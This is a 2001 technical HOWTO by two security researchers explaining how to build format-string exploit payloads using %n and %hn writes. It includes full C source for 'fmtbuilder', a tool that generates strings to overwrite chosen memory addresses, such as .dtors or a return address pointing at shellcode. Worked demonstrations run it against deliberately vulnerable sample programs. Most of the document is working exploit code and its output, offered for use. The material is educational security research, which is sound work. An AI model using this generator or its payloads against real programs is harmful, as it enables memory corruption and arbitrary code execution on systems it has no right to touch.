@@ -1,0 +1,811 @@
+FMTBUILDER-Howto version 0.2
+
+----------------------------------------------------------------
+    Frederic "Pappy" Raynal <frederic.raynal@inria.fr>
+    Samuel "Zorgon" Dralet <samuel.dralet@mastersecurity.fr>
+----------------------------------------------------------------
+
+Date: 08/14/01
+
+[ Contents ]
+
+1.  Introduction
+2.  Usage
+3.  Example
+4.  Notations and goals
+5.  Solution
+6.  %n way
+7.  %hn way
+8.  What if some text is placed before the format string
+9.  Alignment
+10. Example: base and alignment
+11. Special char : \0 and %
+12. Greetings
+13. References
+14. Changelog 
+15. Sources
+
+----------------------------------------------------------------
+
+-------{ 1. Introduction
+
+This document focuses on building format strings to exploit format
+bugs. The reader is supposed to know what they are and howto exploit
+tham, which won't be remind here.
+
+fmtbuider is a small program that aim at building format strings. In
+this document, we explain the methods and tricks used to achieve this
+goal. 
+
+-------{ 2. Usage
+
+Usage : ./fmtbuilder [-nh] -a <locaddr> -r <retaddr> -o <offset> -b <base>
+
+  -a <locaddr> : <locaddr> is the address to overwrite ( .dtors for instance )
+
+  -r <retaddr> : <retaddr> is the address where we expect to return,
+                 for instance because a shellcode is waiting for us ;)
+
+  -o <offset>  : distance (in words) to reach the beginning of our
+                 buffer (i.e. used with the $ format - see printf(3) )
+
+  -b <base>    : <base> is the amount of char placed before the our
+                 own part of the format string.
+
+Two building methods, each with its own pros and cons, are available:
+  
+  -n :	Format string with %n
+  -h :	Format string with %hn
+
+
+-------{ 3. Example
+
+For our educational purpose, we need a very easy vulnerable program:
+
+/* formatme1.c */
+int main( int argc, char ** argv ) 
+{
+  int foo = 0x41414141;
+  char fmt[128];
+
+  memset( fmt, 0, sizeof(fmt) );
+  printf( "foo at 0x%x\n", &foo );
+  printf( "argv[1] = [%s] (%d)\n", argv[1], strlen(argv[1]) );
+  snprintf( fmt, sizeof(fmt), argv[1] );
+  printf( "fmt=[%s] (%d)\n", fmt, strlen(fmt) );
+  printf( "foo=0x%x\n", foo );
+}
+
+Our goal is to change the value of foo to 0x04030201.
+So, we just need to discover the offset to the beginning of our
+buffer:
+
+$ gcc -o formatme1 formatme1.c
+$ ./formatme1 BBBB%6$\x
+foo at 0xbffffae8
+argv[1] = [BBBB%7$x] (8)
+fmt=[BBBB42424242] (12)
+foo=0x41414141
+
+et hop : it is 7 :)
+Since our program gives the address of "foo", we just have to run it:
+
+$ ./formatme1 `./fmtbuilder -r 0x04030201 -a 0xbffffae8 -b 0 -o 7 -n`
+Format string builder version 0.2
+(C) 2001 Pappy & Zorgon
+
+[ Building the fmt string ... ]
+[ Building completed (53) ]
+[ Checking the fmt string ... ]
+[ Checking completed (53) ]
+
+[ fmt string ] = èúÿ¿éúÿ¿êúÿ¿ëúÿ¿%241x%7$n%257x%8$n%257x%9$n%257x%10$n
+
+foo at 0xbffffac8
+argv[1] = [èúÿ¿éúÿ¿êúÿ¿ëúÿ¿%241x%7$n%257x%8$n%257x%9$n%257x%10$n] (53)
+fmt=[èúÿ¿éúÿ¿êúÿ¿ëúÿ¿                                                                                                               ] (127)
+foo=0x41414141
+
+Ok, this first run never works because the position of foo changes
+when a long string is pt in the stack. But the right address is
+displayed by our nice program (foo at 0xbffffac8):
+
+$ ./formatme1 `./fmtbuilder -r 0x04030201 -a 0xbffffac8 -b 0 -o 7 -n`
+Format string builder version 0.2
+(C) 2001 Pappy & Zorgon
+
+[ Building the fmt string ... ]
+[ Building completed (53) ]
+[ Checking the fmt string ... ]
+[ Checking completed (53) ]
+
+[ fmt string ] = Èúÿ¿Éúÿ¿Êúÿ¿Ëúÿ¿%241x%7$n%257x%8$n%257x%9$n%257x%10$n
+
+foo at 0xbffffac8
+argv[1] = [Èúÿ¿Éúÿ¿Êúÿ¿Ëúÿ¿%241x%7$n%257x%8$n%257x%9$n%257x%10$n] (53)
+fmt=[Èúÿ¿Éúÿ¿Êúÿ¿Ëúÿ¿                                                                                                               ] (127)
+foo=0x4030201
+
+And with the %hn (just the last option and the address of foo to
+change): 
+
+$ ./formatme1 `./fmtbuilder -r 0x04030201 -a 0xbffffad8 -b 0 -o 7 -h` 
+Format string builder version 0.2
+(C) 2001 Pappy & Zorgon
+
+[ Building the fmt string ... ]
+[ Building completed (33) ]
+[ Checking the fmt string ... ]
+[ Checking completed (33) ]
+
+[ fmt string ] = Øúÿ¿Úúÿ¿%.66041x%7$n%.66050x%8$hn
+
+foo at 0xbffffad8
+argv[1] = [Øúÿ¿Úúÿ¿%.66041x%7$n%.66050x%8$hn] (33)
+fmt=[Øúÿ¿Úúÿ¿00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000] (127)
+foo=0x4030201
+
+-------{ 4. Notations and goals
+
+
+a 32-bits address is noted [b3 b2 b1 b0] where :
+  - b0 = ( addr >> 24 ) & 0xff;
+  - b1 = ( addr >> 16 ) & 0xff;
+  - b2 = ( addr >>  8 ) & 0xff;
+  - b3 = ( addr       ) & 0xff;
+
+Suppose we wants to write x0 to b0, x1 to b1... (where xi is an
+unsigned char in { 0...255 }).
+
+Independently from the method used to write (%n or %hn), since %n is
+strictly increasing, troubles occur as soon as we don't have
+x3 < x2 < x1 < x0 which is almost always the case ;(
+
+One needs a trick ... and (can you hear the drums rolls;) here it
+comes : the solution is always to force that inequality to be true !
+
+Yes, it seems incredible, isn't it ;)))
+
+
+-------{ 5. Solution
+
+
+A simple but inefficient solution would be to sort each of the xi, but
+that leads to a very painful algorithm since there is 4! = 4 * 3 * 2 * 1 = 24 
+available permutations (and thus as much "special cases" to handle)
+
+We said that the xi's are in { 0...255 } ... but we are going to put
+them in { 256...511 }, by simply adding 256 to each value. And so, one
+byte is no more enough to hold the value, but that is really no matter
+since we are going to use several writings:
+
+  for one writing, we are only interested in the last of the 2 bytes, 
+  the next writing erasing the other (garbage) byte.
+
+
+[ Example ]
+
+Let's x3 = 0x44, x2 = 0x33, x1 = 0x0f and x0 = 0x01
+
+One wants to put in memory [ 0x44 0x33 0x02 0x01 ] ... but
+unfortunately, 0x44 > 0x33
+
+Nevertheless, 0x44 < 0x0133 :)   <- Here is the solution :)
+
+Rather than writing the expected value at a given position, one has to 
+consider this value plus 0x0100. Since the value to write is in
+{ 0...255 }, the written one will be in { 0...255 } + 0x0100 = { 256...511 } 
+and is now coded with 2 bytes.
+
++---------------------------+------------------------+---------------------+
+|     bytes                 |        total           |      retaddr        |
++---------------------------+------------------------+---------------------+
+| 0x44+0x0100      = 0x0144 |          0x0144        | 0x44 0x01   X    X  |
+| 0x33+0x0100-0x44 = 0x00ef | 0x0144+0x00ef = 0x0233 | 0x44 0x33 0x02   X  |
+| 0x0f+0x0100-0x33 = 0x00dc | 0x0203+0x00dc = 0x030f | 0x44 0x33 0x0f 0x03 |
+| 0x01+0x0100-0x0f = 0x00f2 | 0x030f+0x00f2 = 0x0401 | 0x44 0x33 0x0f 0x01 |
++---------------------------+------------------------+---------------------+ 
+( X = undefined )
+
+
+As you can notice in the above table, the "garbage byte" always
+increases and that is what ensures the inequality to be always true.
+
+
+-------{ 6. %n way
+
+The format string is built using 4 consecutive writings %n, (almost)
+as described in Kalou's article (see the references). 
+
+The only difference is the use of the previous trick, which really
+makes life easier ;)
+
+pros:
+  - sometimes, format bugs are also overflow:
+
+    int main( int argc, char ** argv ) 
+    {
+        char buf[64];
+        sprintf( buf, argv[1] );
+    }
+
+    Trying to exploit this with %hn will lead to an overflow: the
+    string formatted by argv[1] will expand but since no check is
+    done, it will overflow the buffer and coredump.
+
+cons:
+  - the string is longer than with the %hn: one needs the 4 %x, one
+    for each %n
+
+  - can overwrite something that is no more in the format string: as
+    shown in the example, writing with %n gets out of bounds. This
+    could become annoying if it changes the value of something
+    important:
+
+      + a variable (or a pointer):
+                     int i = 0;    
+                     char fmt[64];
+                     ...
+                     printf( fmt );
+
+      + the saved %ebp:
+                     void foo() {
+                       char fmt[64];
+                       ...
+                       printf( fmt );
+
+
+-------{ 7. %hn way
+
+
+In a previous article about format bugs, I introduced another solution
+to build the format string using %hn. This solves the cons of the %n
+approach :
+
+  - the string is shorter since you just need 2 %x before the %hn
+  - you don't overwrite anything after the format string since you
+    write only 2 short int (2 bytes each)
+
+Unfortunately, the %hn approach has to face the same problem as with
+%n: the count is strictly increasing ... but almost the same solution
+allows to solve that ;)
+
+In the article, I used a format string looking like that :
+
+          %[val1]x%[val2]x%[offset]hn%[offset+2]hn
+
+Now, rather than using 2 %hn, we use firstly a %n and then a %hn. The
+first %n writes to all the retaddr, even if only the last 2 bytes are
+interesting (i.e. the ones we expect). Then, the %hn overwrite those 2
+"garbage" bytes with the exact value, without overflowing after the
+address. 
+
+With the %n technique, the values are in { 0...255 }. Since we now use 2
+bytes, they are now in { 0...255 * 255 }. So, to be greater than the
+previous written value, adding 0x0100 is no more enough, so we add
+0x0100 * 0x0100 = 0x010000 instead.
+
+
+[ Example ]
+
+We still consider the same values as in the previous example.
+
+The first short we have to write is the low part : 0x4433 but
+unfortunately, 0x4433 > 0x0f01
+Nevertheless, 0x4433 < 0x010f01.
+
+Rather than writing the expected value at a given position, one has to
+consider this value plus 0x010000. Since the value to write is in
+{ 0...65535 }, the written one will be in { 0...65535 } + 0x010000 = 
+{ 65536...131071 } and is now coded with 3 bytes (ok, 4... but the
+last one will be zero)
+
+
++-----------------------------+------------------------+---------------------+
+|         bytes               |        total           |      retaddr        |
++-----------------------------+------------------------+---------------------+
+|0x4433+0x010000=0x014433     |      0x014433	       | 0x44 0x33 0x01   X  |
+|0x0f01+0x010000-0x4433=0xcace|0x014433+0xcace=0x020f01| 0x44 0x33 0x0f 0x01 |
++-----------------------------+------------------------+---------------------+
+
+The second writing is truncated because of the %hn: it cast the value
+to a short int and hence keeps only the last two bytes, which are
+exactly what we want.
+
+
+-------{ 8. What if some text is placed before the format string
+ 
+
+That's no big deal ;)
+If you look in the sources (always look in the source, Luke;) you will
+notice that having some character before the format string or not
+makes almost no difference.
+
+What is done to handle values xi smaller than the previous ones
+(i.e. adding 0x0100 - 0x010000 - to this value) is also usable to
+handle what we call the "base" (these first char) : we also add
+0x0100 (or 0x010000) to the very first value to be sure that our last
+char will be the one we expect.
+
+3 situations are possible:
+  1. base <  x3 : we just have to write x3-base in our format
+  2. base == x3 : idem
+  3. base >  x3 : x3 has to be increased to exceed "base" 
+
+
+But since adding 0x0100 (0x010000) doesn't change our target byte(s),
+we can continue that way. So, we have to add ( base / 0x0100 ) + 1
+(resp. (base / 0x010000) + 1) to x3 to be greater than "base".
+
+[ Example ] 
+
+Take base = 0x0224 (548) (yes, I know, that will never be like that... it
+is just to show that our algo is not so bad ;) and x3 = 0x44.
+
+Using the %n approach, adding only 0x0100 is not enough
+( 0x0100 + 0x44 = 0x0144 < 0x0224 ) So, we have to add 0x0100 until we are
+greater than 0x0224 ... which is exactly given by ( 0x0224 / 0x0100 + 1 = 3 ).
+
+Finally, the first writing is :
+0x44 + 3 * 0x0100 - 0x0224 = 0x0120
+
+Like that, we have written 0x120 + 0x0224 = 0x0344 char for our first
+%n: as you  can see, the last byte is the one expected :)
+
+-------{ 9. Alignment
+
+When dealing with buffer overflows, one has to take care about the
+alignment in memory. With format bugs, this is almost never useful :)
+
+The string used as format string is aligned in memory. The only thing
+that could break that occurs when some char are already in the string
+that is going to be exploited.
+
+For instance, if the string contains "Alert" before being submitted to
+our will, one will have to add 3 char just after so that the length is
+multiple of 4, and thus aligned in memory : "AlertXXX".
+
+We call "base" the length of those char previously in the string.
+
+More generally, one just have to add ( 4 - base%4 ) (% means modulo) to
+base to have a string that is well aligned.
+
+A great care has to be taken when alignment in non-zero to discover
+the offset. One can not expect anymore to retrieve his "marker" in a
+full word. See the following example for further details.
+
+-------{ 10. Example: base and alignment
+
+/* formatme2.c */
+int main( int argc, char ** argv ) 
+{
+  int bar;
+  int foo = 0x41414141;
+  char buffer[1024];
+
+  snprintf( buffer, sizeof(buffer), "%s%s", argv[1], argv[2] );
+  printf( "foo is at 0x%x\n", &foo );
+  printf( buffer );
+  printf( "\nfoo=0x%x\n", foo );
+}
+
+We will use an unaligned input string "ABCDE", so we start by guessing
+the offset:
+
+$ ./formatme2 ABCDE BBBB%9\$x
+foo is at 0xbffffae4
+ABCDEBBBB42424245
+foo=0x41414141
+
+$ ./formatme2 ABCDE BBBB%10\$x
+foo is at 0xbffffae4
+ABCDEBBBB30312542
+foo=0x41414141
+
+We retrieve our BBBB across both offsets 9 and 10. Since we are going
+to add char to align the buffer, we have to use the upper one (10):
+
+$ ./formatme2 ABCDE `./fmtbuilder -r 0x04030201 -a 0xbffffae4 -b 5 -o 10 -n`
+Format string builder version 0.2
+(C) 2001 Pappy & Zorgon
+
+[ Building the fmt string ... ]
+[ Building completed (56) ]
+[ Checking the fmt string ... ]
+[ Checking completed (56) ]
+
+[ fmt string ] = äúÿ¿åúÿ¿æúÿ¿çúÿ¿%233x%10$n%257x%11$n%257x%12$n%257x%13$n
+
+foo is at 0xbffffab4
+ABCDEXXXäúÿ¿åúÿ¿æúÿ¿çúÿ¿                                                        
+         bffffab4                                                               
+....
+....
+foo=0x41414141
+
+Ok, this first run never works because the position of foo changes
+when a long string is pt in the stack. But the right address is
+displayed by our nice program (foo at 0xbffffab4):
+
+$ ./formatme2 ABCDE `./fmtbuilder -r 0x04030201 -a 0xbffffab4 -b 5 -o 10 -n`
+Format string builder version 0.2
+(C) 2001 Pappy & Zorgon
+
+[ Building the fmt string ... ]
+[ Building completed (56) ]
+[ Checking the fmt string ... ]
+[ Checking completed (56) ]
+
+[ fmt string ] = ´úÿ¿µúÿ¿¶úÿ¿·úÿ¿%233x%10$n%257x%11$n%257x%12$n%257x%13$n
+
+foo is at 0xbffffab4
+ABCDEXXX\xb4\xfa\xff\xbf\xb5\xfa\xff\xbf\xb6\xfa\xff\xbf\xb7\xfa\xff\xbf
+
+                                             bffffab4
+....
+....
+foo=0x4030201
+
+Great :)
+
+$ ./formatme2 ABCDE `./fmtbuilder -r 0x04030201 -a 0xbffffac4 -b 5 -o 10 -h` | more
+Format string builder version 0.2
+(C) 2001 Pappy & Zorgon
+
+[ Building the fmt string ... ]
+[ Building completed (35) ]
+[ Checking the fmt string ... ]
+[ Checking completed (35) ]
+
+[ fmt string ] = Äúÿ¿Æúÿ¿%.66033x%10$n%.66050x%11$hn
+
+foo is at 0xbffffac4
+BCDEXXXÄúÿ¿Æúÿ¿0000000000000....
+....
+....
+foo=0x4030201
+
+Still fine :) Lines full of 0 are cut.
+
+
+-------{ 11. Special char : \0 and %
+
+As usual, a NUL byte in a string and everything is lost.
+
+But when dealing with format string, one have to take care of '%'. If
+it is followed by some char in the format string, it can be interpreted 
+as a control char.
+
+/* special_char */
+#include <stdlib.h>
+
+int main( int argc, char ** argv ) 
+{
+  char buf[128];
+  int i, cpt = 0;
+
+  memset( buf, 0, sizeof(buf) );
+
+  for ( i = 0 ; i < strlen(argv[1]) ; i++ ) {
+      if ( argv[1][i] == '%' ) {
+	 buf[cpt++] = '%';
+      }
+      buf[cpt++] = argv[1][i];
+  }
+
+  printf( "raw [" );
+  printf( argv[1] );
+  printf( "]\n" );
+
+  printf( "fmt [" );
+  printf( buf );
+  printf( "]\n" );
+}
+
+This is a simple program to show the consequences of a forgotten '%'
+in the format string.
+
+$ gcc -o special_char special_char.c
+$ ./special_char A%kA
+raw [A%kA]
+fmt [A%kA]
+
+In this first example, everything is fine since "%k" does not mean
+anything. But ...
+
+$ ./special_char A%xA
+raw [A4010b1ccA]
+fmt [A%xA]
+$ ./special_char A%gA
+raw [A2.08527A]
+fmt [A%gA]
+
+As soon as the '%' is followed by a known control char, the string
+becomes a real "format string" and we loose the value we expect to
+write (raw line). But if the '%' is doubled, the value is preserved :)
+
+We add this special handling in the 0.2 version of fmtbuilder.
+
+-------{ 12. Greetings
+
+To Christophe "Korty" Bailleux for having submitted to us the
+problem of automatic format string builder and all his comments.
+
+-------{ 13. References
+
+How to learn more about format strings ?
+
+[1] "More info on format bugs"
+    Pascal "kalou" Bouchareine <pb@grolier.fr>
+    http://www.hert.org/papers/format.html
+
+
+[2] "Format Bugs: What are they, Where did they come from,...
+     How to exploit them "
+    Lamagra <lamagra@digibel.org> 	
+    
+
+[3] "Avoiding security holes when developing an application - 4:
+     Format strings"
+    Frederic "pappy" Raynal <frederic.raynal@inria.fr> 
+    Christophe Grenier <cgr@global-secure.fr>
+    Christophe Blaess <ccb@club-internet.fr>
+    http://minimum.inria.fr/~raynal/index.php3?page=120
+
+
+[4] "Exploiting the format string vulnerabilities"
+    scut / team TESO scut@team-teso.net
+    (sorry to have forget this great one in our previous release)
+    http://www.team-teso.net/articles/formatstring/
+
+
+-------{ 14. Changelogs
+
+v0.1 -> v0.2
+
+  - add a check against NUL char in the format string
+  - add a check against '%' in the format string
+
+-------{ 15. Sources
+
+/*
+ * Copyright (C) 2001  Frederic "Pappy" Raynal <frederic.raynal@inria.fr>
+ * Copyright (C) 2001  Samuel "Zorgon" Dralet <samuel.dralet@mastersecurity.fr>
+ *
+ * This program is free software; you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation; either version 2 of the License, or (at
+ * your option) any later version.
+ * 
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
+ * General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
+ * USA
+ *
+ * 
+ * Compile: gcc -o fmtbuilder -Wall -pedantic fmtbuilder.c
+ *
+ * 
+ * Warning:
+ *    In 2 places, we check the return value from a snprintf().
+ *    So, here is what in the corresponding man page :
+ * 
+ *    glibc <= 2.0 : written = number of characters printed (not
+ *                             including the trailing `\0')
+ * 
+ *    since glibc 2.1 : written = number of characters (excluding the
+ *                      trailing '\0') which would have been written to
+ *                      the final string if enough space had been
+ *                      available.  
+ *   
+ * 
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+
+#define VERSION 	"version 0.2"
+#define MAX_FMT_LENGTH 	128 
+#define ADD		0x100	
+#define FOUR            sizeof( size_t ) * 4
+#define TWO             sizeof( size_t ) * 2
+
+#define OCT( b0, b1, b2, b3, addr, str ) { \
+		b0 = (addr >> 24) & 0xff; \
+        	b1 = (addr >> 16) & 0xff; \
+        	b2 = (addr >>  8) & 0xff; \
+        	b3 = (addr      ) & 0xff; \
+                if ( b0 * b1 * b2 * b3 == 0 ) { \
+                	printf( "\n%s contains a NUL byte. Leaving...\n", str ); \
+                  	exit( EXIT_FAILURE ); \
+                } \
+	}
+
+void
+banniere()
+{
+  fprintf( stderr, "Format string builder %s\n", VERSION);
+  fprintf( stderr, "(C) 2001 Pappy & Zorgon\n\n" );
+}
+
+void 
+usage( char * cmd )
+{
+  banniere();
+  fprintf( stderr, "Usage : %s [-nh] -a <locaddr> -r <retaddr> -o <offset> -b <base>\n", cmd );
+  fprintf( stderr, "  -n :\tformat string with %%n\n");
+  fprintf( stderr, "  -h :\tformat string with %%hn\n");
+  fprintf( stderr, "  -a <locaddr> : address to overwrite.\n" ); 
+  fprintf( stderr, "  -r <retaddr> : address where we want to execute something\n" );
+  fprintf( stderr, "  -o <offset>  : distance in \"words\" to reach the beginnig of the buffer\n" );
+  fprintf( stderr, "  -b <base>    : amount of char placed before our controled part\n\n" );
+  fprintf( stderr, "E.g: %s -n -a 0x080495e8 -r 0x01020304 -o 4 -b 0\n\n", cmd );
+  fprintf( stderr, "[EOF]\n\n" );
+}
+
+int
+build_un( char * buf, unsigned int locaddr, unsigned int retaddr, unsigned int offset, unsigned int base )
+{
+  unsigned char b0, b1, b2, b3;
+  int start = ( (base / ADD) + 1 ) * ADD;
+  int sz;
+
+  /* <locaddr> : where to overwrite */
+  OCT( b0, b1, b2, b3, locaddr, "[ locaddr ]" );
+  sz = snprintf( buf, FOUR + 1,   /* 16 char to have the 4 addresses */
+		 "%c%c%c%c"       /* + 1 for the ending \0 */
+		 "%c%c%c%c"
+		 "%c%c%c%c"
+		 "%c%c%c%c",
+		 b3, b2, b1, b0,
+		 b3 + 1, b2, b1, b0,
+		 b3 + 2, b2, b1, b0,
+		 b3 + 3, b2, b1, b0 );
+
+  /* where is our shellcode ? */
+  OCT( b0, b1, b2, b3, retaddr, "[ retaddr ]" );
+
+  return snprintf( buf + sz, MAX_FMT_LENGTH, 
+		   "%%%dx%%%d$n%%%dx%%%d$n%%%dx%%%d$n%%%dx%%%d$n",
+		   b3 - FOUR + start - base, offset,
+		   b2 - b3 + start, offset + 1,
+		   b1 - b2 + start, offset + 2,
+		   b0 - b1 + start, offset + 3 );
+}
+
+int 
+build_hn( char * buf, unsigned int locaddr, unsigned int retaddr, unsigned int offset, unsigned int base )
+{
+  unsigned char b0, b1, b2, b3;
+  unsigned int high, low;
+  int start = ( (base / (ADD * ADD) ) + 1 ) * ADD * ADD;
+  int sz;
+
+  /* <locaddr> : where to overwrite */
+  OCT( b0, b1, b2, b3, locaddr, "[ locaddr ]" );
+  sz = snprintf( buf, TWO + 1,     /* 8 char to have the 2 addresses */
+	         "%c%c%c%c"        /* + 1 for the ending \0 */
+	         "%c%c%c%c",
+	         b3, b2, b1, b0,
+	         b3 + 2, b2, b1, b0 );
+  
+  /* where is our shellcode ? */
+  OCT( b0, b1, b2, b3, retaddr, "[ retaddr ]" );
+  high = ( retaddr & 0xffff0000 ) >> 16; 
+  low = retaddr & 0x0000ffff;      
+
+  return snprintf( buf + sz, MAX_FMT_LENGTH, 
+		   "%%.%hdx%%%d$n%%.%hdx%%%d$hn", 
+		   low - TWO + start - base, 
+		   offset, 
+		   high - low + start, 
+		   offset + 1 );
+}
+
+int 
+main( int argc, char * argv[] )
+{
+  char opt;
+  char fmt[ MAX_FMT_LENGTH ], checked_fmt[ 2 * MAX_FMT_LENGTH ];
+  unsigned long locaddr, retaddr;
+  unsigned int offset, base, align = 0, length;
+  int ( *build_format_string )( char *, unsigned int, unsigned int, unsigned int, unsigned int ) = build_un;
+  int i = 0, cpt = 0, tmp = FOUR;
+ 
+  if ( argc != 10 ) {
+    usage( argv[0] );
+    exit( EXIT_FAILURE );
+  }
+
+  while ( (opt = getopt( argc, argv, "nha:r:o:b:" )) != EOF )
+    switch( opt )
+      {
+	case 'n':
+	  build_format_string = build_un;
+	  break;
+	case 'h':
+	  build_format_string = build_hn;
+	  break;
+	case 'a':
+	  locaddr = strtoul( optarg, NULL, 16 );
+	  break;
+	case 'r':
+	  retaddr = strtoul( optarg, NULL, 16 );
+	  break;
+	case 'o':
+	  offset = atoi( optarg );
+	  break;
+	case 'b':
+	  base = atoi( optarg );
+	  break;
+	default:
+	  usage( argv[0] );
+	  exit( EXIT_FAILURE );
+      }
+
+  if ( base%4 ) {
+    align = 4 - ( base%4 );
+    base += align;
+  }
+  
+  banniere();
+
+  /* Create the string */
+  fprintf( stderr, "[ Building the fmt string ... ]\n" );
+  memset( fmt, 0, MAX_FMT_LENGTH );
+  length = build_format_string( fmt, locaddr, retaddr, offset, base );
+
+  if ( length == -1 ) {
+    fprintf( stderr, "Error: format string too short :'\n" );
+    fprintf( stderr, "       Set a bigger MAX_FMT_LENGTH (%d)\n",  
+	     MAX_FMT_LENGTH);
+    exit( EXIT_FAILURE );
+  }
+
+  length = strlen( fmt );
+  fprintf( stderr, "[ Building completed (%d) ]\n", length );
+
+  /* Perform some checking on the fmt string */
+  fprintf( stderr, "[ Checking the fmt string ... ]\n" );
+
+  if ( build_format_string == build_hn ) {
+    tmp = TWO;
+  }
+
+  for ( i = 0; i < tmp; i++ ) {
+      switch ( fmt[i] ) {
+        case '%':
+	  fprintf( stderr, "Found a %% at %d.\n", i );
+	  checked_fmt[cpt++] = '%';
+      	default:
+	  checked_fmt[cpt++] = fmt[i];
+      }
+  }
+
+  for ( i = tmp; i < MAX_FMT_LENGTH; i++ ) {
+    checked_fmt[cpt++] = fmt[i];
+  }
+  
+  		 	 
+  length = strlen( fmt );
+  fprintf( stderr, "[ Checking completed (%d) ]\n\n", length );
+    
+  /* Display the string to stdout */
+  for( ; align > 0; --align ) {
+  	fprintf( stdout, "X" );
+  }
+
+  fprintf( stderr, "[ fmt string ] = " );
+  fprintf( stderr, "%s\n", checked_fmt );
+  fprintf( stdout, "%s\n", checked_fmt );
+  fprintf( stderr, "\n" );
+  return( EXIT_SUCCESS );
+}
+
